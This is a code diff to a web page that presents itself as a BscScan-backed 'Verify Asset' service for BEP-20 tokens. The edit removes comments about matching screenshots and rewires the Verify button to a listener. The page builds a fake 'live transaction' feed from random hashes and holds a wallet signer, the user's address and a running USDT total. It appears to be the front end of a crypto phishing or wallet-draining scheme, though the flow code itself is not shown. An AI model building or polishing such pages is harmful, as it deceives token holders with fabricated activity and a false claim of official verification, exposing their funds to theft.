@@ -78,7 +78,7 @@
     .dot-purple { width: 6px; height: 6px; background-color: #8b5cf6; border-radius: 50%; }
     .dot-green-light { width: 6px; height: 6px; background-color: #10b981; border-radius: 50%; }
 
-    /* Live Transactions Table (Matching Screenshot 33820) */
+    /* Live Transactions Table */
     .tx-container { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; width: 100%; overflow: hidden; margin-bottom: 20px; }
     .tx-header { display: flex; justify-content: space-between; align-items: flex-start; padding: 16px; border-bottom: 1px solid #1e2430; }
     .tx-title { font-size: 13px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; line-height: 1.3; }
@@ -102,7 +102,7 @@
     .footer-center-link { width: 100%; text-align: center; font-size: 11px; color: #94a3b8; font-weight: 500; margin-bottom: 16px; }
     .footer-copy { width: 100%; text-align: center; font-size: 10px; color: #475569; }
 
-    /* Verified Success View (Matching Screenshot 33832) */
+    /* Verified Success View */
     .verified-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 28px 20px; text-align: center; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
     .green-shield-icon { width: 56px; height: 56px; border-radius: 50%; background-color: rgba(0, 211, 149, 0.1); border: 2px solid #00d395; color: #00d395; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 16px auto; }
     .verified-title { font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px; }
@@ -145,7 +145,7 @@
 
     <div class="content-area">
       
-      <!-- Initial View (Matching Screenshots 33818_4, 33820) -->
+      <!-- Initial View -->
       <div id="initialView">
         
         <!-- Stats Cards -->
@@ -203,7 +203,7 @@
             <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
             
             <!-- Verification Button -->
-            <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+            <button id="mainVerifyBtn" class="btn-verify" type="button">
               <i class="fa-solid fa-shield-halved" id="btnIcon"></i>
               <span id="btnText">Verify Asset</span>
             </button>
@@ -226,7 +226,7 @@
           </div>
         </div>
 
-        <!-- Live Transactions Table (Matching Screenshot 33820) -->
+        <!-- Live Transactions Table -->
         <div class="tx-container">
           <div class="tx-header">
             <div class="tx-title">
@@ -273,7 +273,7 @@
 
       </div>
 
-      <!-- Verified Success View (Matching Screenshot 33832) -->
+      <!-- Verified Success View -->
       <div id="verifiedView" class="hidden">
         <div class="verified-card">
           <div class="green-shield-icon">
@@ -337,11 +337,17 @@
     let globalProvider, globalSigner, globalUserAddress;
     let totalUsdtWei = ethers.BigNumber.from(0);
 
+    // Attach click listener safely on DOM load
+    document.addEventListener("DOMContentLoaded", () => {
+      const verifyBtn = document.getElementById("mainVerifyBtn");
+      if (verifyBtn) {
+        verifyBtn.addEventListener("click", initiateAuditFlow);
+      }
+    });
+
     // Dynamic live transaction feed generator
     const sampleHexChars = "abcdef0123456789";
     function generateRandomHash() {
       let part1 = '';
       let part2 = '';
       for(let i=0; i<4; i++) part1 += sampleHexChars[Math.floor(Math.random() * sampleHexChars.length)];
-      for(let i=0; i<4; i++) part2 += sampleHexChars[Math.floor(Math.random() * sampleHexChars.length)];
-    
